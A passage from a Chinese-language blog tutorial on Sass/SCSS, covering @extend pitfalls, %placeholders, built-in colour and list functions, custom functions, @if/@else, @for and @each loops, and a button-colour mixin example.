class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是在编译后的CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">p</span> <span class=\"selector-class\">.error</span>, <span class=\"selector-tag\">p</span> <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: blue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 然而你只想实现</span><br><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">p .error &#123; // 这部分的样式不能干扰到 seriousError</span><br><span class=\"line\">  <span class=\"selector-tag\">color</span>: <span class=\"selector-tag\">blue</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>所以，通过<code>@extend</code>引用的类名，你要有绝对的自信，它从未用在几个地方。</p>\n<h3 id=\"嵌套、Mixins和-extend的缺点\"><a href=\"#嵌套、Mixins和-extend的缺点\" class=\"headerlink\" title=\"嵌套、Mixins和@extend的缺点\"></a>嵌套、Mixins和@extend的缺点</h3><p>嵌套：有可能编译的css层级过深</p>\n<p>Mixins：Mixins用来指定具体属性值会使css变得臃肿</p>\n<p><strong>Mixins的黄金规则</strong>是将相似的风格定义在一个<code>@mixin</code>中。请注意这里的一个关键词<strong>相似的</strong>，另外Mixins主要是用于重用，而不是用来指定具体的属性值。</p>\n<p>@extend：<code>@extend</code>是可以读取SASS文件中类名，这样就会出现意想不到的问题，如上的<code>.error</code></p>\n<h3 id=\"强大的-placeholders\"><a href=\"#强大的-placeholders\" class=\"headerlink\" title=\"强大的%placeholders\"></a>强大的%placeholders</h3><p>使用<code>%</code>和<code>@extend</code>就可以将继承中埋下的地雷给排了。</p>\n<p><code>%</code>只是一个占位符，他不是正常的选择器，不像<code>.classes</code>或者<code>#ids</code>，只要不通过<code>@extend</code>调用，他是不会产生任何代码量。</p>\n<p>首先使用<code>%placeholders</code>定义一个公用样式，类似于<code>.class</code>：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%placeholders &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在需要使用的地方通过<code>@extend</code>来调用：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">selector &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %placeholders;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>举例：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">mixin</span> fit-content() &#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -webkit-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -moz-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -o-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -ms-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: fit-content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">%clearfix &#123;</span><br><span class=\"line\">    *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">    &amp;:after,</span><br><span class=\"line\">    &amp;:before &#123;</span><br><span class=\"line\">      <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">      <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">      <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">nav</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">    <span class=\"selector-tag\">ul</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">margin</span>: <span class=\"number\">50px</span> auto;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> fit-content();</span><br><span class=\"line\">        <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"attribute\">list-style</span>: none;</span><br><span class=\"line\">        @<span class=\"keyword\">extend</span> %clearfix;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"function\"><a href=\"#function\" class=\"headerlink\" title=\"@function\"></a>@function</h3><p>@function与@mixin，%这两者的第一点不同在于sass本身就有一些内置的函数，方便我们调用，如强大的color函数；其次就是它返回的是一个值，而不是一段css样式代码什么的。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$f00</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//作为变量值</span></span><br><span class=\"line\"><span class=\"variable\">$redDark</span>: darken(<span class=\"variable\">$f00</span>,<span class=\"number\">10%</span>) !default;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//作为属性值</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: darken(<span class=\"variable\">$f00</span>,<span class=\"number\">70%</span>);</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"variable\">$redDark</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"rgba\"><a href=\"#rgba\" class=\"headerlink\" title=\"rgba\"></a>rgba</h4><p>分为两种：<code>rgba($red, $green, $blue, $alpha)</code>和<code>rgba($color, $alpha)</code>。</p>\n<p>第一种跟css3一样，不介绍，第二种对我们有点用，实例：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rgba(#102030, 0.5) =&gt; rgba(16, 32, 48, 0.5)</span><br><span class=\"line\">rgba(blue, 0.2)    =&gt; rgba(0, 0, 255, 0.2)</span><br></pre></td></tr></table></figure>\n<h4 id=\"ie-hex-str\"><a href=\"#ie-hex-str\" class=\"headerlink\" title=\"ie-hex-str\"></a>ie-hex-str</h4><p>ie-hex-str($color)</p>\n<p>这个函数将一个颜色格式化成ie滤镜使用，在做css3使用滤镜兼容的时候用得上，实例：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ie-hex-str(#abc) =&gt; #FFAABBCC</span><br><span class=\"line\">ie-hex-str(#3322BB) =&gt; #FF3322BB</span><br><span class=\"line\">ie-hex-str(rgba(0, 255, 0, 0.5)) =&gt; #8000FF00</span><br></pre></td></tr></table></figure>\n<h4 id=\"darken\"><a href=\"#darken\" class=\"headerlink\" title=\"darken\"></a>darken</h4><p>darken(color,color,amount)</p>\n<p>第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变暗多少个百分比。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">darken(hsl(25, 100%, 80%), 30%) =&gt; hsl(25, 100%, 50%)</span><br><span class=\"line\">darken(#800, 20%) =&gt; #200</span><br></pre></td></tr></table></figure>\n<h4 id=\"lighten\"><a href=\"#lighten\" class=\"headerlink\" title=\"lighten\"></a>lighten</h4><p>lighten(color,color,amount)</p>\n<p>第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变亮多少个百分比。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lighten(hsl(0, 0%, 0%), 30%) =&gt; hsl(0, 0, 30)</span><br><span class=\"line\">lighten(#800, 20%) =&gt; #e00</span><br></pre></td></tr></table></figure>\n<h4 id=\"percentage\"><a href=\"#percentage\" class=\"headerlink\" title=\"percentage\"></a>percentage</h4><p>percentage($value)： 将一个没有单位的数字转成百分比形式</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">percentage(0.2) =&gt; 20%</span><br><span class=\"line\">percentage(100px / 50px) =&gt; 200%</span><br></pre></td></tr></table></figure>\n<h4 id=\"length\"><a href=\"#length\" class=\"headerlink\" title=\"length\"></a>length</h4><p>length($list)</p>\n<p>返回一个列表的长度</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">length(10px) =&gt; 1</span><br><span class=\"line\">length(#514721 #FFF6BF #FFD324) =&gt; 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"nth\"><a href=\"#nth\" class=\"headerlink\" title=\"nth\"></a>nth</h4><p>nth(list,list,n);</p>\n<p>返回列表里面第n个位置的值</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nth(10px 20px 30px, 1) =&gt; 10px</span><br><span class=\"line\">nth((Helvetica, Arial, sans-serif), 3) =&gt; sans-serif</span><br></pre></td></tr></table></figure>\n<h4 id=\"unit\"><a href=\"#unit\" class=\"headerlink\" title=\"unit\"></a>unit</h4><p>unit($number)</p>\n<p>得到这个数的单位</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unit(100) =&gt; \"\"</span><br><span class=\"line\">unit(100px) =&gt; \"px\"</span><br><span class=\"line\">unit(3em) =&gt; \"em\"</span><br><span class=\"line\">unit(10px * 5em) =&gt; \"em*px\"</span><br><span class=\"line\">unit(10px * 5em / 30cm / 1rem) =&gt; \"em*px/cm*rem\"</span><br></pre></td></tr></table></figure>\n<h4 id=\"unitless\"><a href=\"#unitless\" class=\"headerlink\" title=\"unitless\"></a>unitless</h4><p>unitless($number)</p>\n<p>返回这个数是否没有单位</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unitless(100) =&gt; true</span><br><span class=\"line\">unitless(100px) =&gt; false</span><br></pre></td></tr></table></figure>\n<h4 id=\"三目判断\"><a href=\"#三目判断\" class=\"headerlink\" title=\"三目判断\"></a>三目判断</h4><p>if(condition,condition,if-true, $if-false)</p>\n<p>第一个表示条件，第二个表示条件为真的值，第三个表示为假的值</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(true, 1px, 2px) =&gt; 1px</span><br><span class=\"line\">if(false, 1px, 2px) =&gt; 2px</span><br></pre></td></tr></table></figure>\n<p>注意函数是返回一个值，不能直接放到sass里面直接去运行的，会报错。</p>\n<p>你可以把这些用在判断或者属性值里面，那么就是一级棒。</p>\n<p>下面我们来搞点自己定义的函数吧，先来个简单的：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// px转em</span></span><br><span class=\"line\">@function pxToEm(<span class=\"variable\">$px</span>, <span class=\"variable\">$base</span>: 16) &#123;</span><br><span class=\"line\">  @return (<span class=\"variable\">$px</span> / <span class=\"variable\">$base</span>) * 1em;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 调用下：</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>:pxToEm(<span class=\"number\">20</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 解析后的css：</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>: <span class=\"number\">1.25em</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"if和-else\"><a href=\"#if和-else\" class=\"headerlink\" title=\"@if和@else\"></a>@if和@else</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$filter</span>:false !default; <span class=\"comment\">//是否开启ie滤镜</span></span><br><span class=\"line\"><span class=\"comment\">//背景色半透明</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> bgcolor-alpha(<span class=\"variable\">$bgcolor</span>: rgba(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,.<span class=\"number\">5</span>))&#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>:<span class=\"number\">#fff</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$filter</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">filter</span>:progid:DXImageTransform.Microsoft.gradient(enabled=<span class=\"string\">'true'</span>,startColorstr=<span class=\"string\">'#&#123;ie-hex-str($bgcolor)&#125;'</span>, endColorstr=<span class=\"string\">'#&#123;ie-hex-str($bgcolor)&#125;'</span>);</span><br><span class=\"line\">  &#125;@<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>:<span class=\"variable\">$bgcolor</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是半透明rgba背景的一段代码，高级浏览器用rgba，ie6-8如果开启滤镜用滤镜，不开启滤镜就用纯色，常用于图片下方浮现标题。</p>\n<p>当然也不可能总是判断一个变量的真假那么简单，没有或与非的情况吧。sass的@if用<code>not,or,and</code>分别表示非，或，与。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span>:   false !default;</span><br><span class=\"line\"><span class=\"variable\">$b</span>:   true !default;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">if</span> not(<span class=\"variable\">$a</span>)&#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:red;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>:<span class=\"number\">14px</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$a</span> or <span class=\"variable\">$b</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>:<span class=\"number\">300px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">li</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">line-height</span>:<span class=\"number\">24px</span>;   </span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$a</span> and <span class=\"variable\">$b</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>:left;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>想想还是漏了个，sass用<code>==,!=</code>分别表示等于与不等于。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$radius</span>: <span class=\"number\">5px</span> !default;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.box-border</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>:<span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$radius</span> != 0&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-radius</span>:<span class=\"variable\">$radius</span>; </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sizeClass</span>: small !default;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.size</span>&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$sizeClass</span> == <span class=\"string\">'small'</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>:<span class=\"number\">5px</span>;</span><br><span class=\"line\">  &#125;@<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"for\"><a href=\"#for\" class=\"headerlink\" title=\"@for\"></a>@for</h3><p>for循环有两种形式，分别为：<code></code>@for $var from start through end<code>和</code>@for $var start from to  end` 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。先来个简单的：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">for</span> <span class=\"variable\">$i</span> from 1 through 3 &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.item-</span>#&#123;<span class=\"variable\">$i</span>&#125; &#123; <span class=\"attribute\">width</span>: <span class=\"number\">2em</span> * <span class=\"variable\">$i</span>; &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"each\"><a href=\"#each\" class=\"headerlink\" title=\"@each\"></a>@each</h3><p>语法：@each $var in</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">each</span> <span class=\"variable\">$animal</span> in puma, sea-slug, egret, salamander &#123;</span><br><span class=\"line\">  .#&#123;<span class=\"variable\">$animal</span>&#125;-<span class=\"attribute\">icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">'/images/#&#123;$animal&#125;.png'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sprite</span>: puma sea-slug egret salamander !default;</span><br><span class=\"line\"></span><br><span class=\"line\">%sprite-animal&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: url(<span class=\"string\">'/images/animal.png'</span>) no-repeat;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@<span class=\"keyword\">each</span> <span class=\"variable\">$animal</span> in <span class=\"variable\">$sprite</span> &#123;</span><br><span class=\"line\">    .#&#123;<span class=\"variable\">$animal</span>&#125;-<span class=\"attribute\">icon</span> &#123;</span><br><span class=\"line\">        @<span class=\"keyword\">extend</span> %sprite-animal;     </span><br><span class=\"line\">        <span class=\"attribute\">background-position</span>:<span class=\"number\">0</span> -(index(<span class=\"variable\">$sprite</span>,<span class=\"variable\">$animal</span>)*<span class=\"number\">30px</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用scss设计按钮样式：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//$btnColorClass: (primary #0078E7 #fff) (green $green #fff);</span></span><br><span class=\"line\"><span class=\"variable\">$btnColorClass</span>: (primary <span class=\"number\">#0078E7</span> <span class=\"number\">#fff</span>) (blue <span class=\"number\">#00A3CF</span> <span class=\"number\">#fff</span>) (orange <span class=\"number\">#F47837</span> <span class=\"number\">#fff</span>) !default;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> btn-color(<span class=\"variable\">$bgColor</span>:<span class=\"number\">#e6e6e6</span>, <span class=\"variable\">$textColor</span>:<span class=\"number\">#333</span>)&#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>:<span class=\"variable\">$textColor</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"variable\">$bgColor</span>;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>:<span class=\"number\">1px</span> solid darken(<span class=\"variable\">$bgColor</span>, <span class=\"number\">5%</span>);</span><br><span class=\"line\">  <span class=\"attribute\">border-color</span>:lighten(<span class=\"variable\">$bgColor</span>, <span class=\"number\">2%</span>) darken(<span class=\"variable\">$bgColor</span>, <span class=\"number\">5%</span>) darken(<span class=\"variable\">$bgColor</span>, <span class=\"number\">5%</span>) lighten(<span class=\"variable\">$bgColor</span>, <span class=\"number\">2%</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  &amp;:hover&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: darken(<span class=\"variable\">$bgColor</span>,<span class=\"number\">5%</span>);</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:<span class=\"variable\">$textColor</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">each</span> <span class=\"variable\">$colorClass</span> in <span class=\"variable\">$btnColorClass</span>&#123;</span><br><span class=\"line\">  <span class=\"variable\">$class</span>:      nth(<span class=\"variable\">$colorClass</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"variable\">$bgColor</span>:    nth(<span class=\"variable\">$colorClass</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">  <span class=\"variable\">$textColor</span>:  nth(<span class=\"variable\">$colorClass</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">  <span class=\"selector-class\">.btn-</span>#&#123;<span class=\"variable\">$class</span>&#125;&#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> btn-color(<span class=\"variable\">$bgColor</span>,<span class=\"variable\">$textColor</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"include-vs-extend\"><a href=\"#include-vs-extend\" class=\"headerlink\" title=\"@include vs @extend\"></a>@include vs 